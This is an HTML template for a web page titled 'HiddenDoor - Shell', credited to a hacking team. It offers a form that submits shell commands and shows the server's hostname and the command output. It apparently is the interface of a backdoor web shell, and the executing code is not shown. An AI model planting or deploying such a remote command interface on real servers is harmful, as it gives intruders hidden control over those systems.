<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HiddenDoor - Shell</title>
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <h1>💻 HiddenDoor Shell - trhacknon team</h1>
        <p>🕒 {{.Time}} | 🧠 Server: {{.Hostname}}</p>
        <form method="POST">
            <input type="text" name="cmd" placeholder="Tape une commande autorisée" required>
            <button type="submit">▶️ Exécuter</button>
        </form>
        <div class="cmd-output">
            <strong>Résultat:</strong><br>
            {{.Output}}
        </div>
    </div>
</body>
</html>
